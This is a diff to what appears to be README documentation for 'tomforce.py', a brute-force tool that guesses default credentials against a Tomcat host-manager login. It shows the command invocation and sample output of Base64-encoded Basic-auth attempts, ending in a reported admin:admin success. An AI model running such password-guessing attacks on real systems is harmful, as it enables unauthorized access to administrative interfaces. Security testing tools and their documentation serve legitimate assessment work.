@@ -30,15 +30,16 @@ python3 tomforce.py -U https://example.com -P /host-manager -u usernames.txt -p 
 [*] Trying root:admin → Encoded: cm9vdDphZG1pbg== → HTTP 401                                                                 
 [*] Trying root:12345678 → Encoded: cm9vdDoxMjM0NTY3OA== → HTTP 401                                                          
 [*] Trying root:123456789 → Encoded: cm9vdDoxMjM0NTY3ODk= → HTTP 401                                                         
-[*] Trying root:1234 → Encoded: cm9vdDoxMjM0 → HTTP 401                                                                      
-[*] Trying root:12345 → Encoded: cm9vdDoxMjM0NQ== → HTTP 401                                                                 
-[*] Trying root:password → Encoded: cm9vdDpwYXNzd29yZA== → HTTP 401                                                          
-[*] Trying root:123 → Encoded: cm9vdDoxMjM= → HTTP 401                                                                       
-[*] Trying root:Aa123456 → Encoded: cm9vdDpBYTEyMzQ1Ng== → HTTP 401                                                          
-[*] Trying root:1234567890 → Encoded: cm9vdDoxMjM0NTY3ODkw → HTTP 401                                                        
-[*] Trying root:UNKNOWN → Encoded: cm9vdDpVTktOT1dO → HTTP 401                                                               
-[*] Trying root:1234567 → Encoded: cm9vdDoxMjM0NTY3 → HTTP 401                                                               
-[*] Trying root:123123 → Encoded: cm9vdDoxMjMxMjM= → HTTP 401                                                                
+[*] Trying root:1234 → Encoded: cm9vdDoxMjM0 → HTTP 401                                                                                                                          
 [*] Trying root:111111 → Encoded: cm9vdDoxMTExMTE= → HTTP 401                                                                
 [*] Trying root:Password → Encoded: cm9vdDpQYXNzd29yZA== → HTTP 401
+[*] Trying admin:password → Encoded: YWRtaW46cGFzc3dvcmQ= → HTTP 401
+[*] Trying admin:Password1 → Encoded: YWRtaW46UGFzc3dvcmQx → HTTP 401
+[*] Trying admin:password1 → Encoded: YWRtaW46cGFzc3dvcmQx → HTTP 401
+[*] Trying admin:admin → Encoded: YWRtaW46YWRtaW4= → HTTP 403
+
+[+] Success!
+[+] Username: admin
+[+] Password: admin
+[+] Encoded: YWRtaW46YWRtaW4=
 ```
